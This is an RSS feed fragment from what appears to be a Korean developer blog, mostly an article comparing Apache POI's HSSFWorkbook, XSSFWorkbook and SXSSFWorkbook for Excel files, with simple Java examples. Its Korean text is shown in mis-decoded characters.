      <category domain="https://ckck803.github.io/categories/Develop/Git/">Git</category>
      
      
      <category domain="https://ckck803.github.io/tags/Git/">Git</category>
      
      <category domain="https://ckck803.github.io/tags/Security/">Security</category>
      
      <category domain="https://ckck803.github.io/tags/Gitleaks/">Gitleaks</category>
      
      
      <comments>https://ckck803.github.io/2025/12/22/git/gitleaks/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[JAVA POI] HSSFWorkbook vs XSSFWorkbook vs SXSSFWorkbook ë¹„êµ</title>
      <link>https://ckck803.github.io/2025/12/21/java/poi-workbook-types/</link>
      <guid>https://ckck803.github.io/2025/12/21/java/poi-workbook-types/</guid>
      <pubDate>Sat, 20 Dec 2025 16:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/java/java.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Apache-POI-Workbook-ì¢…ë¥˜&quot;&gt;&lt;a href=&quot;#Apache-POI-Workbook-ì¢…ë¥˜&quot; class=&quot;headerlink&quot; title=&quot;Apache POI Workbook ì¢…ë¥˜&quot;&gt;&lt;/a&gt;Apache POI Workbook ì¢…ë¥˜&lt;/h2&gt;&lt;p&gt;Apache POIëŠ” Microsoft Office íŒŒì¼ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ Java ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. Excel íŒŒì¼ì„ ë‹¤ë£¨ê¸° ìœ„í•´ ì„¸ ê°€ì§€ ì£¼ìš” Workbook êµ¬í˜„ì²´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;ğŸ“Œ-HSSFWorkbook&quot;&gt;&lt;a href=&quot;#ğŸ“Œ-HSSFWorkbook&quot; class=&quot;headerlink&quot; title=&quot;ğŸ“Œ HSSFWorkbook&quot;&gt;&lt;/a&gt;ğŸ“Œ HSSFWorkbook&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;HSSF (Horrible SpreadSheet Format)&lt;/strong&gt; ëŠ” Excel 97-2003 íŒŒì¼ í˜•ì‹(&lt;code&gt;.xls&lt;/code&gt;)ì„ ì²˜ë¦¬í•˜ëŠ” êµ¬í˜„ì²´ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;íŠ¹ì§•&quot;&gt;&lt;a href=&quot;#íŠ¹ì§•&quot; class=&quot;headerlink&quot; title=&quot;íŠ¹ì§•&quot;&gt;&lt;/a&gt;íŠ¹ì§•&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;íŒŒì¼ í˜•ì‹&lt;/strong&gt;: &lt;code&gt;.xls&lt;/code&gt; (Excel 97-2003)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ìµœëŒ€ í–‰ ìˆ˜&lt;/strong&gt;: 65,536í–‰ (2^16)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ìµœëŒ€ ì—´ ìˆ˜&lt;/strong&gt;: 256ì—´ (2^8)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ìµœëŒ€ Cell Style&lt;/strong&gt;: 4,000ê°œ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ë©”ëª¨ë¦¬ ì‚¬ìš©&lt;/strong&gt;: ì¤‘ê°„ ìˆ˜ì¤€ (ì „ì²´ íŒŒì¼ì„ ë©”ëª¨ë¦¬ì— ë¡œë“œ)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ì²˜ë¦¬ ì†ë„&lt;/strong&gt;: XSSFë³´ë‹¤ ë¹ ë¦„&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ì‚¬ìš©-ì˜ˆì‹œ&quot;&gt;&lt;a href=&quot;#ì‚¬ìš©-ì˜ˆì‹œ&quot; class=&quot;headerlink&quot; title=&quot;ì‚¬ìš© ì˜ˆì‹œ&quot;&gt;&lt;/a&gt;ì‚¬ìš© ì˜ˆì‹œ&lt;/h3&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.poi.hssf.usermodel.HSSFWorkbook;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; org.apache.poi.ss.usermodel.*;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.FileOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;HSSFExample&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// HSSFWorkbook ìƒì„±&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;Workbook&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;workbook&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;HSSFWorkbook&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;Sheet&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;sheet&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; workbook.createSheet(&lt;span class=&quot;string&quot;&gt;&amp;quot;Sample&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// ë°ì´í„° ì‘ì„±&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;Row&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; sheet.createRow(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;Cell&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;cell&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; row.createCell(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cell.setCellValue(&lt;span class=&quot;string&quot;&gt;&amp;quot;Hello, HSSF!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;// .xls íŒŒì¼ë¡œ ì €ì¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;fileOut&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;FileOutputStream&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;sample.xls&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            workbook.write(fileOut);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        workbook.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ì¥ì &quot;&gt;&lt;a href=&quot;#ì¥ì &quot; class=&quot;headerlink&quot; title=&quot;ì¥ì &quot;&gt;&lt;/a&gt;ì¥ì &lt;/h3&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/java/java.png"></p><h2 id="Apache-POI-Workbook-ì¢…ë¥˜"><a href="#Apache-POI-Workbook-ì¢…ë¥˜" class="headerlink" title="Apache POI Workbook ì¢…ë¥˜"></a>Apache POI Workbook ì¢…ë¥˜</h2><p>Apache POIëŠ” Microsoft Office íŒŒì¼ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ Java ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤. Excel íŒŒì¼ì„ ë‹¤ë£¨ê¸° ìœ„í•´ ì„¸ ê°€ì§€ ì£¼ìš” Workbook êµ¬í˜„ì²´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.</p><h2 id="ğŸ“Œ-HSSFWorkbook"><a href="#ğŸ“Œ-HSSFWorkbook" class="headerlink" title="ğŸ“Œ HSSFWorkbook"></a>ğŸ“Œ HSSFWorkbook</h2><p><strong>HSSF (Horrible SpreadSheet Format)</strong> ëŠ” Excel 97-2003 íŒŒì¼ í˜•ì‹(<code>.xls</code>)ì„ ì²˜ë¦¬í•˜ëŠ” êµ¬í˜„ì²´ì…ë‹ˆë‹¤.</p><h3 id="íŠ¹ì§•"><a href="#íŠ¹ì§•" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li><strong>íŒŒì¼ í˜•ì‹</strong>: <code>.xls</code> (Excel 97-2003)</li><li><strong>ìµœëŒ€ í–‰ ìˆ˜</strong>: 65,536í–‰ (2^16)</li><li><strong>ìµœëŒ€ ì—´ ìˆ˜</strong>: 256ì—´ (2^8)</li><li><strong>ìµœëŒ€ Cell Style</strong>: 4,000ê°œ</li><li><strong>ë©”ëª¨ë¦¬ ì‚¬ìš©</strong>: ì¤‘ê°„ ìˆ˜ì¤€ (ì „ì²´ íŒŒì¼ì„ ë©”ëª¨ë¦¬ì— ë¡œë“œ)</li><li><strong>ì²˜ë¦¬ ì†ë„</strong>: XSSFë³´ë‹¤ ë¹ ë¦„</li></ul><h3 id="ì‚¬ìš©-ì˜ˆì‹œ"><a href="#ì‚¬ìš©-ì˜ˆì‹œ" class="headerlink" title="ì‚¬ìš© ì˜ˆì‹œ"></a>ì‚¬ìš© ì˜ˆì‹œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.hssf.usermodel.HSSFWorkbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HSSFExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// HSSFWorkbook ìƒì„±</span></span><br><span class="line">        <span class="type">Workbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HSSFWorkbook</span>();</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Sample&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ë°ì´í„° ì‘ì„±</span></span><br><span class="line">        <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(<span class="number">0</span>);</span><br><span class="line">        <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(<span class="number">0</span>);</span><br><span class="line">        cell.setCellValue(<span class="string">&quot;Hello, HSSF!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// .xls íŒŒì¼ë¡œ ì €ì¥</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sample.xls&quot;</span>)) &#123;</span><br><span class="line">            workbook.write(fileOut);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        workbook.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì¥ì "><a href="#ì¥ì " class="headerlink" title="ì¥ì "></a>ì¥ì </h3><ul><li>ì˜¤ë˜ëœ Excel ë²„ì „ê³¼ì˜ í˜¸í™˜ì„±</li><li>XSSFë³´ë‹¤ ë¹ ë¥¸ ì²˜ë¦¬ ì†ë„</li><li>ì‘ì€ íŒŒì¼ í¬ê¸°</li></ul><h3 id="ë‹¨ì "><a href="#ë‹¨ì " class="headerlink" title="ë‹¨ì "></a>ë‹¨ì </h3><ul><li>í–‰&#x2F;ì—´ ì œí•œì´ ì‘ìŒ (65,536í–‰, 256ì—´)</li><li>Cell Style ì œí•œ (4,000ê°œ)</li><li>êµ¬í˜• íŒŒì¼ í¬ë§· (í˜„ëŒ€ì ì¸ Excel ê¸°ëŠ¥ ì œí•œ)</li></ul><h2 id="ğŸ“Œ-XSSFWorkbook"><a href="#ğŸ“Œ-XSSFWorkbook" class="headerlink" title="ğŸ“Œ XSSFWorkbook"></a>ğŸ“Œ XSSFWorkbook</h2><p><strong>XSSF (XML SpreadSheet Format)</strong> ëŠ” Excel 2007 ì´í›„ íŒŒì¼ í˜•ì‹(<code>.xlsx</code>)ì„ ì²˜ë¦¬í•˜ëŠ” êµ¬í˜„ì²´ì…ë‹ˆë‹¤.</p><p><code>.xlsx</code> íŒŒì¼ì„ ì „ì²´ DOM êµ¬ì¡°ë¡œ ë©”ëª¨ë¦¬ì— ë¡œë“œí•´ ëª¨ë“  ì‹œíŠ¸ &#x2F; í–‰ &#x2F; ì…€ ê°ì²´ê°€ ë©”ëª¨ë¦¬ì— ìƒì£¼í•˜ê¸° ë•Œë¬¸ì— ëœë¤ ì ‘ê·¼(ì„ì˜ ì…€ ìˆ˜ì •, ì´ë™) ì— ë§¤ìš° í¸ë¦¬í•˜ëŠ” ì´ì ì´ ìˆìŠµë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ íŒŒì¼ë‚´ ëª¨ë“  ë°ì´í„°ë¥¼ ë©”ëª¨ë¦¬ì— ë¡œë“œí•˜ê¸° ë•Œë¬¸ì— ëŒ€ìš©ëŸ‰ íŒŒì¼ì—ëŠ” ë©”ëª¨ë¦¬ ë¶€ë‹´ì´ í¬ë‹¤ëŠ” ë‹¨ì ì´ ìˆìŠµë‹ˆë‹¤.</p><h3 id="íŠ¹ì§•-1"><a href="#íŠ¹ì§•-1" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li><strong>íŒŒì¼ í˜•ì‹</strong>: <code>.xlsx</code> (Excel 2007+)</li><li><strong>ìµœëŒ€ í–‰ ìˆ˜</strong>: 1,048,576í–‰ (2^20)</li><li><strong>ìµœëŒ€ ì—´ ìˆ˜</strong>: 16,384ì—´ (2^14)</li><li><strong>ìµœëŒ€ Cell Style</strong>: 64,000ê°œ</li><li><strong>ë©”ëª¨ë¦¬ ì‚¬ìš©</strong>: ë†’ìŒ (ì „ì²´ íŒŒì¼ì„ ë©”ëª¨ë¦¬ì— ë¡œë“œ)</li><li><strong>ì²˜ë¦¬ ì†ë„</strong>: HSSFë³´ë‹¤ ëŠë¦¼ (XML íŒŒì‹± ì˜¤ë²„í—¤ë“œ)</li></ul><h3 id="ì‚¬ìš©-ì˜ˆì‹œ-1"><a href="#ì‚¬ìš©-ì˜ˆì‹œ-1" class="headerlink" title="ì‚¬ìš© ì˜ˆì‹œ"></a>ì‚¬ìš© ì˜ˆì‹œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.usermodel.XSSFWorkbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XSSFExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// XSSFWorkbook ìƒì„±</span></span><br><span class="line">        <span class="type">Workbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>();</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Sample&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ë°ì´í„° ì‘ì„±</span></span><br><span class="line">        <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(<span class="number">0</span>);</span><br><span class="line">        <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(<span class="number">0</span>);</span><br><span class="line">        cell.setCellValue(<span class="string">&quot;Hello, XSSF!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ìŠ¤íƒ€ì¼ ì ìš©</span></span><br><span class="line">        <span class="type">CellStyle</span> <span class="variable">style</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line">        <span class="type">Font</span> <span class="variable">font</span> <span class="operator">=</span> workbook.createFont();</span><br><span class="line">        font.setBold(<span class="literal">true</span>);</span><br><span class="line">        font.setFontHeightInPoints((<span class="type">short</span>) <span class="number">14</span>);</span><br><span class="line">        style.setFont(font);</span><br><span class="line">        cell.setCellStyle(style);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// .xlsx íŒŒì¼ë¡œ ì €ì¥</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sample.xlsx&quot;</span>)) &#123;</span><br><span class="line">            workbook.write(fileOut);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        workbook.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì¥ì -1"><a href="#ì¥ì -1" class="headerlink" title="ì¥ì "></a>ì¥ì </h3><ul><li>ëŒ€ìš©ëŸ‰ ë°ì´í„° ì§€ì› (100ë§Œ í–‰ ì´ìƒ)</li><li>ë§ì€ Cell Style ì§€ì› (64,000ê°œ)</li><li>í˜„ëŒ€ì ì¸ Excel ê¸°ëŠ¥ ì§€ì›</li><li>ì••ì¶•ëœ XML í˜•ì‹ìœ¼ë¡œ íŒŒì¼ í¬ê¸° ê°ì†Œ</li></ul><h3 id="ë‹¨ì -1"><a href="#ë‹¨ì -1" class="headerlink" title="ë‹¨ì "></a>ë‹¨ì </h3><ul><li>ë†’ì€ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰</li><li>HSSFë³´ë‹¤ ëŠë¦° ì²˜ë¦¬ ì†ë„</li><li>ëŒ€ìš©ëŸ‰ íŒŒì¼ ì²˜ë¦¬ ì‹œ OutOfMemoryError ë°œìƒ ê°€ëŠ¥</li></ul><h2 id="ğŸ“Œ-SXSSFWorkbook"><a href="#ğŸ“Œ-SXSSFWorkbook" class="headerlink" title="ğŸ“Œ SXSSFWorkbook"></a>ğŸ“Œ SXSSFWorkbook</h2><p><strong>SXSSF (Streaming XML SpreadSheet Format)</strong> ëŠ” XSSFWorkbookì˜ ë©”ëª¨ë¦¬ ìµœì í™” ë²„ì „ìœ¼ë¡œ, ëŒ€ìš©ëŸ‰ Excel íŒŒì¼ì„ ìƒì„±í•  ë•Œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><h3 id="íŠ¹ì§•-2"><a href="#íŠ¹ì§•-2" class="headerlink" title="íŠ¹ì§•"></a>íŠ¹ì§•</h3><ul><li><strong>íŒŒì¼ í˜•ì‹</strong>: <code>.xlsx</code> (Excel 2007+)</li><li><strong>ìµœëŒ€ í–‰ ìˆ˜</strong>: 1,048,576í–‰ (2^20)</li><li><strong>ìµœëŒ€ ì—´ ìˆ˜</strong>: 16,384ì—´ (2^14)</li><li><strong>ìµœëŒ€ Cell Style</strong>: 64,000ê°œ</li><li><strong>ë©”ëª¨ë¦¬ ì‚¬ìš©</strong>: ë‚®ìŒ (ìœˆë„ìš° ë°©ì‹ìœ¼ë¡œ ì¼ë¶€ë§Œ ë©”ëª¨ë¦¬ì— ìœ ì§€)</li><li><strong>ì²˜ë¦¬ ì†ë„</strong>: ì“°ê¸°ëŠ” ë¹ ë¥´ì§€ë§Œ ì½ê¸° ë¶ˆê°€</li><li><strong>ê¸°ë³¸ ìœˆë„ìš° í¬ê¸°</strong>: 100í–‰ (ë³€ê²½ ê°€ëŠ¥)</li></ul><h3 id="ì‚¬ìš©-ì˜ˆì‹œ-2"><a href="#ì‚¬ìš©-ì˜ˆì‹œ-2" class="headerlink" title="ì‚¬ìš© ì˜ˆì‹œ"></a>ì‚¬ìš© ì˜ˆì‹œ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.streaming.SXSSFWorkbook;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SXSSFExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// SXSSFWorkbook ìƒì„± (ë©”ëª¨ë¦¬ì— 100í–‰ë§Œ ìœ ì§€)</span></span><br><span class="line">        <span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Large Data&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ëŒ€ìš©ëŸ‰ ë°ì´í„° ì‘ì„±</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">rowNum</span> <span class="operator">=</span> <span class="number">0</span>; rowNum &lt; <span class="number">100000</span>; rowNum++) &#123;</span><br><span class="line">            <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(rowNum);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">colNum</span> <span class="operator">=</span> <span class="number">0</span>; colNum &lt; <span class="number">10</span>; colNum++) &#123;</span><br><span class="line">                <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(colNum);</span><br><span class="line">                cell.setCellValue(<span class="string">&quot;Row &quot;</span> + rowNum + <span class="string">&quot;, Col &quot;</span> + colNum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// .xlsx íŒŒì¼ë¡œ ì €ì¥</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;large_sample.xlsx&quot;</span>)) &#123;</span><br><span class="line">            workbook.write(fileOut);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì„ì‹œ íŒŒì¼ ì •ë¦¬ (ì¤‘ìš”!)</span></span><br><span class="line">        workbook.dispose();</span><br><span class="line">        workbook.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ê³ ê¸‰-ì„¤ì •"><a href="#ê³ ê¸‰-ì„¤ì •" class="headerlink" title="ê³ ê¸‰ ì„¤ì •"></a>ê³ ê¸‰ ì„¤ì •</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.streaming.SXSSFWorkbook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SXSSFAdvanced</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// ìœˆë„ìš° í¬ê¸° ì„¤ì • (ë©”ëª¨ë¦¬ì— ìœ ì§€í•  í–‰ ìˆ˜)</span></span><br><span class="line">        <span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì„ì‹œ íŒŒì¼ ì••ì¶• ì‚¬ìš© (ë©”ëª¨ë¦¬ ì ˆì•½)</span></span><br><span class="line">        workbook.setCompressTempFiles(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ìë™ í”ŒëŸ¬ì‹œ ì„¤ì •</span></span><br><span class="line">        <span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Data&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... ë°ì´í„° ì‘ì„± ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ë°˜ë“œì‹œ dispose() í˜¸ì¶œí•˜ì—¬ ì„ì‹œ íŒŒì¼ ì •ë¦¬</span></span><br><span class="line">        workbook.dispose();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì¥ì -2"><a href="#ì¥ì -2" class="headerlink" title="ì¥ì "></a>ì¥ì </h3><ul><li>ë§¤ìš° ë‚®ì€ ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰</li><li>ëŒ€ìš©ëŸ‰ ë°ì´í„° ì²˜ë¦¬ ê°€ëŠ¥ (ìˆ˜ë°±ë§Œ í–‰)</li><li>OutOfMemoryError ë°©ì§€</li><li>ìŠ¤íŠ¸ë¦¬ë° ë°©ì‹ìœ¼ë¡œ ë¹ ë¥¸ ì“°ê¸° ì„±ëŠ¥</li></ul><h3 id="ë‹¨ì -2"><a href="#ë‹¨ì -2" class="headerlink" title="ë‹¨ì "></a>ë‹¨ì </h3><ul><li><strong>ì½ê¸° ë¶ˆê°€ëŠ¥</strong> (ì“°ê¸° ì „ìš©)</li><li>ì´ì „ í–‰ìœ¼ë¡œ ëŒì•„ê°€ì„œ ìˆ˜ì • ë¶ˆê°€ (ìœˆë„ìš° ë°–ì˜ í–‰)</li><li>ì„ì‹œ íŒŒì¼ ìƒì„± (ë°˜ë“œì‹œ <code>dispose()</code> í˜¸ì¶œ í•„ìš”)</li><li>ëœë¤ ì•¡ì„¸ìŠ¤ ë¶ˆê°€</li></ul><h3 id="ì£¼ì˜ì‚¬í•­"><a href="#ì£¼ì˜ì‚¬í•­" class="headerlink" title="ì£¼ì˜ì‚¬í•­"></a>ì£¼ì˜ì‚¬í•­</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì˜ëª»ëœ ì˜ˆì‹œ - ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ ë°œìƒ</span></span><br><span class="line"><span class="type">SXSSFWorkbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SXSSFWorkbook</span>();</span><br><span class="line">workbook.write(outputStream);</span><br><span 